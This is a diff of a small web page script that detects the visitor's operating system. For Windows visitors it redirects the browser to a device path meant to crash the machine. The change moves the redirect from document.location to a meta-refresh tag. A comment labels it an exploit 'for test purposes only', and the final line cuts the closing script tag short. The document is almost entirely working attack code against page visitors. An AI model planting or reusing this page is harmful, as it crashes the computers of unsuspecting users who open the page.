@@ -1,4 +1,5 @@
 <script>
+//for test purposes only. exploit not mine ;P
 function getOS() {
   var userAgent = window.navigator.userAgent,
       platform = window.navigator.platform,
@@ -13,7 +14,8 @@ function getOS() {
     document.write(platform+" detected. works on win10 chrome only.");
   } else if (windowsPlatforms.indexOf(platform) !== -1) {
     document.write(platform+" detected.");
-    document.location.replace("\\.\globalroot\device\condrv\kernelconnect");
+    document.write("<meta http-equiv='refresh'
+   content='0; url=\/\/.\/globalroot\/device\/condrv\/kernelconnect'>");
   } else if (/Android/.test(userAgent)) {
     document.write(platform+" detected. works on win10 chrome only.");
   } else if (!os && /Linux/.test(platform)) {
@@ -25,4 +27,4 @@ function getOS() {
 
 
 getOS();
-</script>
+</scr
